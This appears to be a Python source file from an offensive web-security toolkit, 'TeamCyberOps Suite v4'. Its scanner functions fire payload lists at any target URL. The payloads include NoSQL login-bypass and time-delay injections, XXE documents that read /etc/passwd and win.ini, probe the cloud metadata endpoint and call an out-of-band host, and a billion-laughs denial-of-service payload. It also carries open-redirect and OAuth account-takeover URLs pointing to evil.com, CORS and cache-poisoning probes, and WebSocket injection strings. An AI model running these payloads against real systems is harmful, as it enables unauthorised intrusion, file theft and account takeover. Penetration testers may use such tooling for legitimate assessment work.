"""
TeamCyberOps Suite v4 — Web Security Scanners
Prototype Pollution · Cache Poisoning · CORS · Open Redirect · NoSQL · WebSocket
"""
import urllib.request, urllib.parse, json, re, socket, ssl, threading, time
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent.parent
LOGS_DIR = BASE_DIR / "logs"


def _req(url, method="GET", data=None, headers=None, timeout=10):
    hdrs = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json",**(headers or {})}
    try:
        body = json.dumps(data).encode() if data else None
        r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return {"status":resp.status,"body":resp.read(3000).decode("utf-8","replace"),
                    "headers":dict(resp.headers),"ok":True}
    except urllib.error.HTTPError as e:
        return {"status":e.code,"body":e.read(500).decode("utf-8","replace"),"headers":dict(e.headers),"ok":False}
    except Exception as ex:
        return {"status":None,"error":str(ex),"body":"","ok":False}


# ── PROTOTYPE POLLUTION ──────────────────────────────────────────
PROTO_PAYLOADS = [
    {"__proto__":{"polluted":"tcops4"}},
    {"constructor":{"prototype":{"polluted":"tcops4"}}},
    {"__proto__[polluted]":"tcops4"},
    {"__proto__.polluted":"tcops4"},
    {"a.b.c.__proto__.polluted":"tcops4"},
    {"constructor[prototype][polluted]":"tcops4"},
]
PROTO_PARAMS = ["json","data","body","payload","input","query","filter","search","options","config"]

def scan_prototype_pollution(target_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] Prototype Pollution scan: {target_url}", "info")
    for payload in PROTO_PAYLOADS:
        for param in PROTO_PARAMS[:3]:
            try:
                test_url = f"{target_url}?{param}={urllib.parse.quote(json.dumps(payload))}"
                r = _req(test_url)
                if r.get("body") and "tcops4" in r["body"]:
                    result = {"vulnerable":True,"url":test_url,"payload":payload,"reflection":"body"}
                    results.append(result)
                    log(f"[!] PROTOTYPE POLLUTION: {param} reflects payload!", "ok")
                    break
                r2 = _req(target_url, "POST", payload)
                if r2.get("body") and "tcops4" in r2["body"]:
                    results.append({"vulnerable":True,"url":target_url,"payload":payload,"method":"POST"})
                    log(f"[!] PROTOTYPE POLLUTION (POST): reflects payload!", "ok")
            except Exception: pass
    if not results:
        log("[-] No prototype pollution detected", "dim")
    return {"target":target_url,"findings":results,"vulnerable":len(results)>0}


# ── CACHE POISONING ──────────────────────────────────────────────
CACHE_HEADERS = [
    "X-Forwarded-Host","X-Host","X-Forwarded-Server","X-HTTP-Host-Override",
    "X-Forwarded-For","X-Original-URL","X-Rewrite-URL","X-Custom-IP-Authorization",
]
def scan_cache_poisoning(target_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] Cache Poisoning scan: {target_url}", "info")
    canary = "tcops4-cache-test"
    for header in CACHE_HEADERS:
        try:
            r = _req(target_url, headers={header: canary})
            if r.get("body") and canary in r["body"]:
                results.append({"header":header,"reflected":True,"url":target_url})
                log(f"[!] Header {header} reflected in response!", "ok")
            if r.get("headers"):
                for k,v in r["headers"].items():
                    if canary in str(v):
                        results.append({"header":header,"reflected_in_header":k})
                        log(f"[!] Header {header} reflected in response header {k}!", "ok")
        except Exception: pass
    # Fat GET test
    try:
        r = _req(target_url + "?cb=" + canary)
        if r.get("body") and canary in r["body"]:
            results.append({"type":"fat_get","reflected":True})
            log(f"[!] Cache key param reflected — possible cache poisoning", "ok")
    except Exception: pass
    if not results:
        log("[-] No cache poisoning vectors detected", "dim")
    return {"target":target_url,"findings":results,"vulnerable":len(results)>0}


# ── OPEN REDIRECT ────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    "https://evil.com","//evil.com","/\\evil.com","https:evil.com",
    "///evil.com","////evil.com","https://evil.com%23",
    "https://evil.com%3F","https://evil.com%2F%2F",
    "javascript:alert(1)","data:text/html,<script>alert(1)</script>",
    "%2Fevil.com","..%2F..%2Fevil.com",
]
REDIRECT_PARAMS = ["url","redirect","return","next","goto","target","link","to","from","dest","destination","redir","r","u","return_url","redirect_uri","redirect_url","continue","forward"]

def scan_open_redirect(target_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] Open Redirect scan: {target_url}", "info")
    base = target_url.split("?")[0]
    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS[:4]:
            test = f"{base}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test, headers={"User-Agent":"Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=8)
                final = resp.geturl()
                if "evil.com" in final or "evil.com" in resp.read(500).decode("utf-8","replace"):
                    results.append({"param":param,"payload":payload,"url":test})
                    log(f"[!] Open Redirect via {param}={payload}", "ok")
            except urllib.error.HTTPError as e:
                if e.code in (301,302,303,307,308):
                    loc = e.headers.get("Location","")
                    if "evil.com" in loc:
                        results.append({"param":param,"payload":payload,"location":loc})
                        log(f"[!] Redirect to: {loc}", "ok")
            except Exception: pass
    if not results:
        log("[-] No open redirects detected", "dim")
    return {"target":target_url,"findings":results,"vulnerable":len(results)>0}


# ── CORS EXPLOIT CHAIN ───────────────────────────────────────────
CORS_ORIGINS = [
    "https://evil.com","null","https://evil.{target}","https://{target}.evil.com",
    "https://evil.com.{target}","https://{target}evil.com",
]

def scan_cors(target_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] CORS scan: {target_url}", "info")
    try:
        parsed = urllib.parse.urlparse(target_url)
        target_domain = parsed.netloc
    except Exception:
        target_domain = "target.com"
    
    for origin_tpl in CORS_ORIGINS:
        origin = origin_tpl.replace("{target}", target_domain)
        try:
            r = _req(target_url, headers={"Origin": origin})
            acao = r.get("headers",{}).get("Access-Control-Allow-Origin","")
            acac = r.get("headers",{}).get("Access-Control-Allow-Credentials","")
            if acao:
                issue = None
                if acao == "*":
                    issue = "Wildcard ACAO — any origin allowed"
                elif acao == origin and "evil" in origin:
                    issue = f"Reflected Origin: {origin}"
                elif acao == "null":
                    issue = "null origin accepted"
                if issue:
                    creds = acac.lower() == "true"
                    results.append({
                        "origin":origin,"acao":acao,"credentials":creds,
                        "issue":issue,"critical":creds and acao!="*"
                    })
                    sev = "CRITICAL" if creds else "HIGH"
                    log(f"[!] [{sev}] CORS: {issue} (creds={creds})", "ok")
        except Exception: pass
    if not results:
        log("[-] No CORS misconfigurations detected", "dim")
    return {"target":target_url,"findings":results,"vulnerable":len(results)>0}


# ── NOSQL INJECTION ──────────────────────────────────────────────
NOSQL_PAYLOADS = {
    "login_bypass": [
        {"username":{"$ne":""},"password":{"$ne":""}},
        {"username":{"$gt":""},"password":{"$gt":""}},
        {"username":{"$regex":".*"},"password":{"$regex":".*"}},
        {"username":"admin","password":{"$ne":"wrongpassword"}},
    ],
    "data_extraction": [
        {"$where":"this.password.match(/.*/)"},
        {"username":{"$in":["admin","root","administrator"]}},
        {"$or":[{"admin":True},{"role":"admin"}]},
    ],
    "time_based": [
        {"$where":"var x=new Date();while(new Date()-x<5000){}; return true;"},
        {"username":{"$where":"sleep(5000)"}},
    ],
}

def scan_nosql(target_url, endpoint="/api/login", log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] NoSQL Injection scan: {target_url}{endpoint}", "info")
    base = target_url.rstrip("/") + endpoint
    for category, payloads in NOSQL_PAYLOADS.items():
        for payload in payloads:
            try:
                start = time.time()
                r = _req(base, "POST", payload)
                elapsed = time.time() - start
                body = r.get("body","")
                if category == "time_based" and elapsed > 4:
                    results.append({"type":"time_based","payload":str(payload),"elapsed":elapsed})
                    log(f"[!] NoSQL Time-based injection! ({elapsed:.1f}s delay)", "ok")
                elif r.get("status") == 200 and any(k in body.lower() for k in ["token","session","success","welcome","dashboard"]):
                    results.append({"type":category,"payload":str(payload),"status":r["status"]})
                    log(f"[!] NoSQL {category}: status {r['status']} — possible auth bypass!", "ok")
                    break
                elif r.get("status") not in (400,422) and any(k in body.lower() for k in ["mongo","bson","objectid","$ne"]):
                    results.append({"type":"error_based","payload":str(payload),"body_hint":body[:100]})
                    log(f"[!] NoSQL error-based leak detected!", "ok")
            except Exception: pass
    if not results:
        log("[-] No NoSQL injection detected", "dim")
    return {"target":target_url,"endpoint":endpoint,"findings":results,"vulnerable":len(results)>0}


# ── WEBSOCKET TESTER ─────────────────────────────────────────────
WS_PAYLOADS = [
    '{"type":"PING"}',
    '{"type":"admin","cmd":"whoami"}',
    '<script>alert(1)</script>',
    "' OR '1'='1",
    '{"__proto__":{"polluted":"1"}}',
    '{"$gt":""}',
    '{"id":1,"action":"getUser","userId":0}',
    '{"id":2,"action":"getUser","userId":9999}',
]

def test_websocket(ws_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] WebSocket test: {ws_url}", "info")
    
    # Parse WS URL
    try:
        if ws_url.startswith("wss://"):
            host = ws_url[6:].split("/")[0]
            path = "/" + "/".join(ws_url[6:].split("/")[1:]) if "/" in ws_url[6:] else "/"
            port = 443; use_ssl = True
        elif ws_url.startswith("ws://"):
            host = ws_url[5:].split("/")[0]
            path = "/" + "/".join(ws_url[5:].split("/")[1:]) if "/" in ws_url[5:] else "/"
            port = 80; use_ssl = False
        else:
            log("[-] Invalid WebSocket URL (must start with ws:// or wss://)", "err")
            return {"error":"Invalid URL"}
        
        if ":" in host:
            host, port = host.rsplit(":",1); port = int(port)
    except Exception as e:
        log(f"[-] URL parse error: {e}", "err")
        return {"error":str(e)}

    try:
        import base64, hashlib
        sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        key = base64.b64encode(b"teamcyberops4444").decode()
        handshake = (f"GET {path} HTTP/1.1\r\n"
                     f"Host: {host}\r\n"
                     f"Upgrade: websocket\r\n"
                     f"Connection: Upgrade\r\n"
                     f"Sec-WebSocket-Key: {key}\r\n"
                     f"Sec-WebSocket-Version: 13\r\n\r\n")
        sock.sendall(handshake.encode())
        resp = sock.recv(4096).decode("utf-8","replace")

        if "101 Switching Protocols" in resp:
            log(f"[✓] WebSocket handshake OK", "ok")
            results.append({"type":"connection","status":"connected"})

            # Send test payloads
            for payload in WS_PAYLOADS[:4]:
                try:
                    # Basic WS frame (unmasked text)
                    msg = payload.encode()
                    frame = bytes([0x81, len(msg)]) + msg
                    sock.sendall(frame)
                    sock.settimeout(3)
                    try:
                        data = sock.recv(4096)
                        decoded = data[2:].decode("utf-8","replace") if len(data) > 2 else ""
                        log(f"  → sent: {payload[:40]}", "dim")
                        log(f"  ← recv: {decoded[:60]}", "dim")
                        if any(k in decoded.lower() for k in ["error","exception","stack","traceback","mongo","sql"]):
                            results.append({"type":"error_leak","payload":payload,"response":decoded[:100]})
                            log(f"  [!] Possible error/info leak in WS response", "ok")
                    except socket.timeout:
                        log(f"  [t] Timeout on: {payload[:30]}", "dim")
                except Exception: pass
        else:
            log(f"[-] WS handshake failed: {resp[:80]}", "warn")
        sock.close()
    except Exception as e:
        log(f"[-] Connection error: {e}", "err")
        results.append({"error":str(e)})
    
    return {"target":ws_url,"findings":results,"vulnerable":any(f.get("type")=="error_leak" for f in results)}


# ── XXE AUTO-EXPLOITER ───────────────────────────────────────────
XXE_PAYLOADS = {
    "file_read": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
    "ssrf_aws": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>''',
    "oob_dns": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OAST_HOST/xxe-test">
%xxe;]>
<root><data>test</data></root>''',
    "windows": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
    "php_filter": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>''',
    "billion_laughs": '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>''',
}

def scan_xxe(target_url, oast_host="", log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] XXE scan: {target_url}", "info")
    for name, payload in XXE_PAYLOADS.items():
        if "OAST_HOST" in payload:
            if not oast_host:
                log(f"  [*] Skipping OOB test (no OAST host set)", "dim"); continue
            payload = payload.replace("OAST_HOST", oast_host)
        try:
            r = _req(target_url, "POST", None,
                     headers={"Content-Type":"application/xml"},
                     timeout=10)
            if r.get("status") in (200, 500):
                # Send actual XML
                req = urllib.request.Request(
                    target_url,
                    data=payload.encode(),
                    headers={"Content-Type":"application/xml","User-Agent":"Mozilla/5.0"},
                    method="POST")
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read(3000).decode("utf-8","replace")
                if any(k in body for k in ["root:","[boot loader]","lol","amazonaws"]):
                    results.append({"type":name,"payload_used":payload[:100],"response":body[:200]})
                    log(f"[!] XXE {name} CONFIRMED!", "ok")
                elif r.get("status") == 500:
                    results.append({"type":name,"possible":True,"status":500})
                    log(f"[?] XXE {name}: server error — possible", "warn")
        except Exception as e:
            log(f"  [-] {name}: {str(e)[:40]}", "dim")
    if not results:
        log("[-] No XXE vulnerability detected", "dim")
    return {"target":target_url,"findings":results,"vulnerable":len(results)>0}


# ── OAUTH ACCOUNT TAKEOVER AUTO-TESTER ──────────────────────────
OAUTH_ATTACKS = {
    "csrf_no_state":    lambda url: re.sub(r'[&?]state=[^&]*', '', url),
    "redirect_open":    lambda url: re.sub(r'redirect_uri=[^&]*', 'redirect_uri=https://evil.com', url),
    "redirect_append":  lambda url: re.sub(r'(redirect_uri=[^&]*)', r'\1.evil.com', url),
    "pkce_downgrade":   lambda url: re.sub(r'[&?]code_challenge[^&]*', '', url),
    "scope_upgrade":    lambda url: url + '&scope=openid+email+profile+admin',
    "implicit_flow":    lambda url: re.sub(r'response_type=code', 'response_type=token', url),
}

def test_oauth_ato(auth_url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    results = []
    log(f"[*] OAuth ATO test: {auth_url[:80]}...", "info")

    parsed = urllib.parse.urlparse(auth_url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    # 1. State parameter check
    if 'state' not in params:
        results.append({"type":"CSRF","severity":"HIGH","detail":"No state parameter — CSRF possible"})
        log("[!] No state param — CSRF vulnerability!", "ok")
    else:
        log(f"[+] State param present: {params['state'][:20]}...", "dim")

    # 2. Redirect URI validation
    if 'redirect_uri' in params:
        orig_redir = params['redirect_uri']
        for attack_name, transform in [
            ("open_redirect",   orig_redir.replace("https://","https://evil.com@")),
            ("subdomain",       orig_redir.replace(".",".evil.com.",1)),
            ("path_traversal",  orig_redir + "/../evil"),
        ]:
            test_url = auth_url.replace(urllib.parse.quote(orig_redir, safe=''),
                                         urllib.parse.quote(transform, safe=''))
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent":"Mozilla/5.0"})
                r = urllib.request.urlopen(req, timeout=8)
                final = r.geturl()
                if "evil.com" in final:
                    results.append({"type":"Open Redirect via redirect_uri","url":test_url,"severity":"CRITICAL"})
                    log(f"[!] redirect_uri accepts {attack_name}!", "ok")
            except urllib.error.HTTPError as e:
                loc = e.headers.get("Location","")
                if "evil.com" in loc:
                    results.append({"type":f"Redirect URI {attack_name}","location":loc,"severity":"CRITICAL"})
                    log(f"[!] [{attack_name}] Redirects to: {loc}", "ok")
            except Exception: pass

    # 3. PKCE check
    if 'code_challenge' not in params and params.get('response_type') == 'code':
        results.append({"type":"No PKCE","severity":"MEDIUM","detail":"Authorization code flow without PKCE"})
        log("[?] No PKCE — code interception possible", "warn")

    # 4. Implicit flow
    if params.get('response_type') in ('token','id_token'):
        results.append({"type":"Implicit Flow","severity":"MEDIUM","detail":"Implicit flow leaks tokens in URL/Referer"})
        log("[?] Implicit flow — token leaked in browser history/Referer", "warn")

    # 5. Generate attack URLs
    log("\n[*] Generated attack URLs:", "info")
    attack_urls = {}
    for name, fn in OAUTH_ATTACKS.items():
        try:
            aurl = fn(auth_url)
            attack_urls[name] = aurl
            log(f"  [{name}]", "dim")
            log(f"    {aurl[:100]}", "dim")
        except Exception: pass

    if not results:
        log("[-] No obvious OAuth misconfigurations detected", "dim")

    return {"target":auth_url,"findings":results,"attack_urls":attack_urls,"vulnerable":len(results)>0}
